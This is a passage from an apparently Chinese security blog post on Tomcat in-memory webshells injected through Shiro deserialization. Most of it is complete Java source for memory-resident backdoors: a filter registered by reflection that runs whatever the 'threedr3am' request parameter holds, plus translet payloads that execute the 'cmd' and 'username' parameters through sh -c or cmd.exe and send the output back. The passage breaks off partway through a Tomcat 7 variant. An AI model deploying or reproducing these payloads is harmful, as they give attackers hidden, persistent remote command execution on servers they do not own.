title="步骤二（包含众多细节"></a>步骤二（包含众多细节</h4><p>文章几乎没有废话，我这里不重复了，就提一下关键点</p><p>首先获取到request和response对象</p><p>然后动态注入Filter不成功，需要反射修改值（或者通过反射context这个字段自行添加filterDef</p><p>接着最早创建的filter被封装成FilterDef添加到了context的filterDefs中，但是filterMaps中并不存在，其实在下面代码执行<code>filterRegistration.addMappingForUrlPatterns</code>的时候已经添加进去了</p><div class="code-wrapper"><pre><code class="hljs reasonml">javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.add<span class="hljs-constructor">Filter(<span class="hljs-string">&quot;threedr3am&quot;</span>, <span class="hljs-params">threedr3am</span>)</span>;filterRegistration.add<span class="hljs-constructor">MappingForUrlPatterns(<span class="hljs-params">java</span>.<span class="hljs-params">util</span>.EnumSet.<span class="hljs-params">of</span>(<span class="hljs-params">javax</span>.<span class="hljs-params">servlet</span>.DispatcherType.REQUEST)</span>, <span class="hljs-literal">false</span>, <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;/*&quot;</span>&#125;);</code></pre></div><p>继续是跟上述一样的问题，FilterDef也不存在filterConfigs中，这里通过反射调用<code>StandardContext</code>的<code>filterStart</code>方法，遍历了filterDefs，一个个实例化成ApplicationFilterConfig添加到filterConfigs</p><p>最后是处理shiro的问题，因为shrio会先处理所有Filter，所以把我们的Filter放在第一位</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> javax.servlet.Filter;<span class="hljs-keyword">import</span> javax.servlet.FilterChain;<span class="hljs-keyword">import</span> javax.servlet.FilterConfig;<span class="hljs-keyword">import</span> javax.servlet.ServletException;<span class="hljs-keyword">import</span> javax.servlet.ServletRequest;<span class="hljs-keyword">import</span> javax.servlet.ServletResponse;<span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> threedr3am</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TomcatShellInject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;    <span class="hljs-keyword">static</span> &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-comment">/*shell注入，前提需要能拿到request、response等*/</span>            java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> org.apache.catalina.core.ApplicationFilterChain.class                .getDeclaredField(<span class="hljs-string">&quot;lastServicedRequest&quot;</span>);            f.setAccessible(<span class="hljs-literal">true</span>);            <span class="hljs-type">ThreadLocal</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> (ThreadLocal) f.get(<span class="hljs-literal">null</span>);            <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;            <span class="hljs-comment">//不为空则意味着第一次反序列化的准备工作已成功</span>            <span class="hljs-keyword">if</span> (t != <span class="hljs-literal">null</span> &amp;&amp; t.get() != <span class="hljs-literal">null</span>) &#123;                servletRequest = (ServletRequest) t.get();            &#125;            <span class="hljs-keyword">if</span> (servletRequest != <span class="hljs-literal">null</span>) &#123;                javax.servlet.<span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> servletRequest.getServletContext();                org.apache.catalina.core.<span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;                <span class="hljs-comment">//判断是否已有该名字的filter，有则不再添加</span>                <span class="hljs-keyword">if</span> (servletContext.getFilterRegistration(<span class="hljs-string">&quot;threedr3am&quot;</span>) == <span class="hljs-literal">null</span>) &#123;                    <span class="hljs-comment">//遍历出标准上下文对象</span>                    <span class="hljs-keyword">for</span> (; standardContext == <span class="hljs-literal">null</span>; ) &#123;                        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">contextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);                        contextField.setAccessible(<span class="hljs-literal">true</span>);                        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> contextField.get(servletContext);                        <span class="hljs-keyword">if</span> (o <span class="hljs-keyword">instanceof</span> javax.servlet.ServletContext) &#123;                            servletContext = (javax.servlet.ServletContext) o;                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (o <span class="hljs-keyword">instanceof</span> org.apache.catalina.core.StandardContext) &#123;                            standardContext = (org.apache.catalina.core.StandardContext) o;                        &#125;                    &#125;                    <span class="hljs-keyword">if</span> (standardContext != <span class="hljs-literal">null</span>) &#123;                        <span class="hljs-comment">//修改状态，要不然添加不了</span>                        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">stateField</span> <span class="hljs-operator">=</span> org.apache.catalina.util.LifecycleBase.class                            .getDeclaredField(<span class="hljs-string">&quot;state&quot;</span>);                        stateField.setAccessible(<span class="hljs-literal">true</span>);                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);                        <span class="hljs-comment">//创建一个自定义的Filter马</span>                        <span class="hljs-type">Filter</span> <span class="hljs-variable">threedr3am</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TomcatShellInject</span>();                        <span class="hljs-comment">//添加filter马</span>                        javax.servlet.FilterRegistration.<span class="hljs-type">Dynamic</span> <span class="hljs-variable">filterRegistration</span> <span class="hljs-operator">=</span> servletContext                            .addFilter(<span class="hljs-string">&quot;threedr3am&quot;</span>, threedr3am);                        filterRegistration.setInitParameter(<span class="hljs-string">&quot;encoding&quot;</span>, <span class="hljs-string">&quot;utf-8&quot;</span>);                        filterRegistration.setAsyncSupported(<span class="hljs-literal">false</span>);                        filterRegistration                            .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="hljs-literal">false</span>,                                <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/*&quot;</span>&#125;);                        <span class="hljs-comment">//状态恢复，要不然服务不可用</span>                        <span class="hljs-keyword">if</span> (stateField != <span class="hljs-literal">null</span>) &#123;                            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);                        &#125;                        <span class="hljs-keyword">if</span> (standardContext != <span class="hljs-literal">null</span>) &#123;                            <span class="hljs-comment">//生效filter</span>                            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">filterStartMethod</span> <span class="hljs-operator">=</span> org.apache.catalina.core.StandardContext.class                                .getMethod(<span class="hljs-string">&quot;filterStart&quot;</span>);                            filterStartMethod.setAccessible(<span class="hljs-literal">true</span>);                            filterStartMethod.invoke(standardContext, <span class="hljs-literal">null</span>);                            <span class="hljs-comment">//把filter插到第一位</span>                            org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext                                .findFilterMaps();                            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; filterMaps.length; i++) &#123;                                <span class="hljs-keyword">if</span> (filterMaps[i].getFilterName().equalsIgnoreCase(<span class="hljs-string">&quot;threedr3am&quot;</span>)) &#123;                                    org.apache.tomcat.util.descriptor.web.<span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> filterMaps[i];                                    filterMaps[i] = filterMaps[<span class="hljs-number">0</span>];                                    filterMaps[<span class="hljs-number">0</span>] = filterMap;                                    <span class="hljs-keyword">break</span>;                                &#125;                            &#125;                        &#125;                    &#125;                &#125;            &#125;        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span>        <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse,</span><span class="hljs-params">        FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;        System.out.println(            <span class="hljs-string">&quot;TomcatShellInject doFilter.....................................................................&quot;</span>);        String cmd;        <span class="hljs-keyword">if</span> ((cmd = servletRequest.getParameter(<span class="hljs-string">&quot;threedr3am&quot;</span>)) != <span class="hljs-literal">null</span>) &#123;            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);            java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(                <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(process.getInputStream()));            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">stringBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();            String line;            <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>) &#123;                stringBuilder.append(line + <span class="hljs-string">&#x27;\n&#x27;</span>);            &#125;            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());            servletResponse.getOutputStream().flush();            servletResponse.getOutputStream().close();            <span class="hljs-keyword">return</span>;        &#125;        filterChain.doFilter(servletRequest, servletResponse);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;    &#125;&#125;</code></pre></div><p><img src="/../images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240229112057309.png" alt="image-20240229112057309"></p><h3 id="另起炉灶寻找获取request和response的方式"><a href="#另起炉灶寻找获取request和response的方式" class="headerlink" title="另起炉灶寻找获取request和response的方式"></a>另起炉灶寻找获取request和response的方式</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">https://mp.weixin.qq.com/s?__biz&#x3D;MzIwNDA2NDk5OQ&#x3D;&#x3D;&amp;mid&#x3D;2651374294&amp;idx&#x3D;3&amp;sn&#x3D;82d050ca7268bdb7bcf7ff7ff293d7b3</a></p><p>看原文，因为自己也没什么收获，总结不出东西</p><p>经过作者分析得出来这样的东西</p><div class="code-wrapper"><pre><code class="hljs xl">S<span class="hljs-function"><span class="hljs-title">tandardService</span>---&gt;</span>C<span class="hljs-function"><span class="hljs-title">onnector</span>---&gt;</span>A<span class="hljs-function"><span class="hljs-title">bstractProtocol</span>$ConnectoinHandler---&gt;</span>R<span class="hljs-function"><span class="hljs-title">equestGroupInfo</span>(global)---&gt;</span>R<span class="hljs-function"><span class="hljs-title">equestInfo</span>-------&gt;</span>R<span class="hljs-function"><span class="hljs-title">equest</span>--------&gt;</span>Response</code></pre></div><p>然后我们需要了解一个东西</p><p><strong>Tomcat的类加载机制并不是传统的双亲委派机制，因为传统的双亲委派机制并不适用于多个Web App的情况。</strong></p><p>假设WebApp A依赖了common-collection 3.1，而WebApp B依赖了common-collection 3.2 这样在加载的时候由于全限定名相同，不能同时加载，所以必须对各个webapp进行隔离，如果使用双亲委派机制，那么在加载一个类的时候会先去他的父加载器加载，这样就无法实现隔离，</p><p>tomcat隔离的实现方式是每个WebApp用一个独有的ClassLoader实例来优先处理加载，并不会传递给父加载器。这个定制的ClassLoader就是WebappClassLoader</p><p>之前有了解过，但不会利用</p><p>通过<code>Thread.currentThread.getContextClassLoader()</code>获取上下文类加载器</p><p>在这之中就有我们需要的<code>StandardService</code></p><p><img src="/../images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240229113741646.png" alt="image-20240229113741646"></p><p>最后变成</p><div class="code-wrapper"><pre><code class="hljs xl">W<span class="hljs-function"><span class="hljs-title">ebappClassLoaderBase</span> ---&gt;</span> A<span class="hljs-function"><span class="hljs-title">pplicationContext</span>(getResources().getContext()) ---&gt;</span> S<span class="hljs-function"><span class="hljs-title">tandardService</span>---&gt;</span>C<span class="hljs-function"><span class="hljs-title">onnector</span>---&gt;</span>A<span class="hljs-function"><span class="hljs-title">bstractProtocol</span>$ConnectoinHandler---&gt;</span>R<span class="hljs-function"><span class="hljs-title">equestGroupInfo</span>(global)---&gt;</span>R<span class="hljs-function"><span class="hljs-title">equestInfo</span>-------&gt;</span>R<span class="hljs-function"><span class="hljs-title">equest</span>--------&gt;</span>Response</code></pre></div><p>注意最后拿到的Request对象是<code>org.apache.coyote.Request</code>，而真正需要其实是<code>org.apache.catalina.connector.Request</code>对象，前者是是应用层对于请求-响应对象的底层实现，并不方便使用，通过调用其getNote方法可以得到后者</p><p>github上的代码（这里测试的是shiro环境，会有tomcat的header长度限制，所以可以先反射修改maxHeaderSize</p><div class="code-wrapper"><pre><code class="hljs reasonml">org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Thread</span>.</span></span>current<span class="hljs-constructor">Thread()</span>.get<span class="hljs-constructor">ContextClassLoader()</span>;org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) webappClassLoaderBase.get<span class="hljs-constructor">Resources()</span>.get<span class="hljs-constructor">Context()</span>;Field contextField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;context&quot;</span>)</span>;contextField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;org.apache.catalina.core.ApplicationContext ApplicationContext = (org.apache.catalina.core.ApplicationContext)contextField.get(standardContext);Field serviceField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;service&quot;</span>)</span>;serviceField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService)serviceField.get(ApplicationContext);Field connectorsField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.catalina.core.StandardService&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;connectors&quot;</span>)</span>;connectorsField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;org.apache.catalina.connector.Connector<span class="hljs-literal">[]</span> connectors = (org.apache.catalina.connector.Connector<span class="hljs-literal">[]</span>)connectorsField.get(standardService);org.apache.coyote.ProtocolHandler protocolHandler = connectors<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>.get<span class="hljs-constructor">ProtocolHandler()</span>;Field handlerField = org.apache.coyote.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractProtocol</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;handler&quot;</span>)</span>;handlerField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);Field globalField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;global&quot;</span>)</span>;globalField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;RequestGroupInfo global = (RequestGroupInfo) globalField.get(handler);Field processors = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;processors&quot;</span>)</span>;processors.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;java.util.List&lt;RequestInfo&gt; RequestInfolist = (java.util.List&lt;RequestInfo&gt;) processors.get(global);Field req = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;req&quot;</span>)</span>;req.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<span class="hljs-keyword">for</span> (RequestInfo requestInfo : RequestInfolist) &#123;    org.apache.coyote.Request request1 = (org.apache.coyote.Request )req.get(requestInfo);    org.apache.catalina.connector.Request request2 = ( org.apache.catalina.connector.Request)request1.get<span class="hljs-constructor">Note(1)</span>;    org.apache.catalina.connector.Response response2 = request2.get<span class="hljs-constructor">Response()</span>;    java.io.Writer w = response2.get<span class="hljs-constructor">Writer()</span>;    String cmd = request2.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;cmd&quot;</span>)</span>;    boolean isLinux = <span class="hljs-literal">true</span>;    String osTyp = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;os.name&quot;</span>)</span>;    <span class="hljs-keyword">if</span> (osTyp != null<span class="hljs-operator"> &amp;&amp; </span>osTyp.<span class="hljs-keyword">to</span><span class="hljs-constructor">LowerCase()</span>.contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;        isLinux = <span class="hljs-literal">false</span>;    &#125;    String<span class="hljs-literal">[]</span> cmds = isLinux ? <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125; : <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;    InputStream <span class="hljs-keyword">in</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(cmds).get<span class="hljs-constructor">InputStream()</span>;    Scanner s = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Scanner(<span class="hljs-params">in</span>)</span>.use<span class="hljs-constructor">Delimiter(<span class="hljs-string">&quot;\\a&quot;</span>)</span>;    String output = s.has<span class="hljs-constructor">Next()</span> ? s.next<span class="hljs-literal">()</span> : <span class="hljs-string">&quot;&quot;</span>;    w.write(output);    w.flush<span class="hljs-literal">()</span>;    Field responseField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ResponseFacade</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;response&quot;</span>)</span>;    responseField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;    Field usingWriter = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Response</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;usingWriter&quot;</span>)</span>;    usingWriter.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;    usingWriter.set(response2, Boolean.FALSE);&#125;</code></pre></div><h3 id="从上一篇中的存储了request的另一个点进行分析"><a href="#从上一篇中的存储了request的另一个点进行分析" class="headerlink" title="从上一篇中的存储了request的另一个点进行分析"></a>从上一篇中的存储了request的另一个点进行分析</h3><p><a href="https://xz.aliyun.com/t/7535">https://xz.aliyun.com/t/7535</a></p><p><img src="/../images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240229121030031.png" alt="image-20240229121030031"></p><p>tomcat7,8获取这条链的方式大同小异，变化之处在于<code>name=&quot;http-bio-8888&quot;,type=GlobalRequestProcessor</code>，其中8888是tomcat服务端端口，在tomcat8里面bio变为nio</p><p>tomcat8</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<span class="hljs-keyword">import</span> org.apache.coyote.Request;<span class="hljs-keyword">import</span> org.apache.tomcat.util.buf.ByteChunk;<span class="hljs-keyword">import</span> org.apache.tomcat.util.modeler.Registry;<span class="hljs-keyword">import</span> javax.management.MBeanServer;<span class="hljs-keyword">import</span> java.io.InputStream;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">tomcat82</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">tomcat82</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">try</span>&#123;            <span class="hljs-type">MBeanServer</span> <span class="hljs-variable">mbeanServer</span> <span class="hljs-operator">=</span> Registry.getRegistry((Object)<span class="hljs-literal">null</span>, (Object)<span class="hljs-literal">null</span>).getMBeanServer();            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.jmx.mbeanserver.JmxMBeanServer&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;mbsInterceptor&quot;</span>);            field.setAccessible(<span class="hljs-literal">true</span>);            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> field.get(mbeanServer);            field = Class.forName(<span class="hljs-string">&quot;com.sun.jmx.interceptor.DefaultMBeanServerInterceptor&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;repository&quot;</span>);            field.setAccessible(<span class="hljs-literal">true</span>);            obj = field.get(obj);            field = Class.forName(<span class="hljs-string">&quot;com.sun.jmx.mbeanserver.Repository&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;domainTb&quot;</span>);            field.setAccessible(<span class="hljs-literal">true</span>);            <span class="hljs-type">HashMap</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> (HashMap)field.get(obj);            obj = ((HashMap)obj2.get(<span class="hljs-string">&quot;Catalina&quot;</span>)).get(<span class="hljs-string">&quot;name=\&quot;http-nio-8888\&quot;,type=GlobalRequestProcessor&quot;</span>);            field = Class.forName(<span class="hljs-string">&quot;com.sun.jmx.mbeanserver.NamedObject&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;object&quot;</span>);            field.setAccessible(<span class="hljs-literal">true</span>);            obj = field.get(obj);            field = Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.modeler.BaseModelMBean&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;resource&quot;</span>);            field.setAccessible(<span class="hljs-literal">true</span>);            obj = field.get(obj);            field = Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;processors&quot;</span>);            field.setAccessible(<span class="hljs-literal">true</span>);            <span class="hljs-type">ArrayList</span> <span class="hljs-variable">obj3</span> <span class="hljs-operator">=</span> (ArrayList)field.get(obj);            field = Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;req&quot;</span>);            field.setAccessible(<span class="hljs-literal">true</span>);            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;            <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);            <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;                isLinux = <span class="hljs-literal">false</span>;            &#125;            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; obj3.size(); i++) &#123;                <span class="hljs-type">Request</span> <span class="hljs-variable">obj4</span> <span class="hljs-operator">=</span> (Request) field.get(obj3.get(i));                <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> obj4.getParameters().getParameter(<span class="hljs-string">&quot;username&quot;</span>);                <span class="hljs-keyword">if</span>(username != <span class="hljs-literal">null</span>)&#123;                    String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, username&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>,  username&#125;;                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();                    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\a&quot;</span>);                    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;                    <span class="hljs-keyword">while</span> (s.hasNext())&#123;                        output += s.next();                    &#125;                    <span class="hljs-type">byte</span>[] buf = output.getBytes();                    <span class="hljs-type">ByteChunk</span> <span class="hljs-variable">bc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteChunk</span>();                    bc.setBytes(buf, <span class="hljs-number">0</span>, buf.length);                    obj4.getResponse().doWrite(bc);                    <span class="hljs-keyword">break</span>;                &#125;            &#125;        &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;&#125;</code></pre></div><p>tomcat7</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<span class="hljs-keyword">import</span> org.apache.coyote.Request;<span class="hljs-keyword">import</span> org.apache.tomcat.util.buf.ByteChunk;<span class="hljs-keyword">import</span> org.apache.tomcat.util.modeler.Registry;<span class="hljs-keyword">import</span> javax.management.MBeanServer;<span class="hljs-keyword">import</span> java.io.InputStream;<span class="hljs-keyword">import</span> 